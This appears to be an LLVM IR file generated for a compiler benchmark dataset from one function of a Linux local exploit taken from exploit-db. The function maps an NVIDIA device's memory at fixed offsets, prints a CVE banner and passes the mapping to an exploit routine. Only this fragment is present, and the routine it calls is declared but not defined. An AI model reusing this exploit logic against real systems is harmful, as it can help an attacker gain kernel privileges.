; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_nvidia_handle.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_20201.c_nvidia_handle.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@MAP_FAILED = common dso_local global i32* null, align 8
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@cve_2012_YYYY = common dso_local global i32* null, align 8
@.str = private unnamed_addr constant [19 x i8] c"[*] CVE-2012-YYYY\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32* @nvidia_handle(i32 %0, i64 %1) #0 {
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32*, align 8
  store i32 %0, i32* %4, align 4
  store i64 %1, i64* %5, align 8
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %9, label %11

9:                                                ; preds = %2
  %10 = load i32*, i32** @MAP_FAILED, align 8
  store i32* %10, i32** %3, align 8
  br label %54

11:                                               ; preds = %2
  %12 = load i32, i32* @PROT_READ, align 4
  %13 = load i32, i32* @PROT_WRITE, align 4
  %14 = or i32 %12, %13
  %15 = load i32, i32* @MAP_SHARED, align 4
  %16 = load i32, i32* %4, align 4
  %17 = load i64, i64* %5, align 8
  %18 = add nsw i64 %17, 6393856
  %19 = call i8* @mmap(i32* null, i32 4096, i32 %14, i32 %15, i32 %16, i64 %18)
  %20 = bitcast i8* %19 to i32*
  store i32* %20, i32** @cve_2012_YYYY, align 8
  store i32* %20, i32** %6, align 8
  %21 = load i32*, i32** %6, align 8
  %22 = load i32*, i32** @MAP_FAILED, align 8
  %23 = icmp ne i32* %21, %22
  br i1 %23, label %24, label %52

24:                                               ; preds = %11
  %25 = load i32*, i32** %6, align 8
  %26 = getelementptr inbounds i32, i32* %25, i64 960
  %27 = load volatile i32, i32* %26, align 4
  %28 = and i32 %27, 8
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %30, label %47

30:                                               ; preds = %24
  %31 = load i32, i32* @PROT_READ, align 4
  %32 = load i32, i32* @PROT_WRITE, align 4
  %33 = or i32 %31, %32
  %34 = load i32, i32* @MAP_SHARED, align 4
  %35 = load i32, i32* %4, align 4
  %36 = load i64, i64* %5, align 8
  %37 = add nsw i64 %36, 655360
  %38 = call i8* @mmap(i32* null, i32 65536, i32 %33, i32 %34, i32 %35, i64 %37)
  %39 = bitcast i8* %38 to i32*
  store i32* %39, i32** %6, align 8
  %40 = load i32*, i32** @MAP_FAILED, align 8
  %41 = icmp ne i32* %39, %40
  br i1 %41, label %42, label %47

42:                                               ; preds = %30
  %43 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0))
  %44 = load i32*, i32** @cve_2012_YYYY, align 8
  %45 = call i32 @mode_x(i32* %44)
  %46 = load i32*, i32** %6, align 8
  store i32* %46, i32** %3, align 8
  br label %54

47:                                               ; preds = %30, %24
  %48 = load i32*, i32** @cve_2012_YYYY, align 8
  %49 = bitcast i32* %48 to i8*
  %50 = call i32 @munmap(i8* %49, i32 4096)
  %51 = load i32*, i32** @MAP_FAILED, align 8
  store i32* %51, i32** @cve_2012_YYYY, align 8
  store i32* %51, i32** %6, align 8
  br label %52

52:                                               ; preds = %47, %11
  %53 = load i32*, i32** %6, align 8
  store i32* %53, i32** %3, align 8
  br label %54

54:                                               ; preds = %52, %42, %9
  %55 = load i32*, i32** %3, align 8
  ret i32* %55
}

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i64) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @mode_x(i32*) #1

declare dso_local i32 @munmap(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
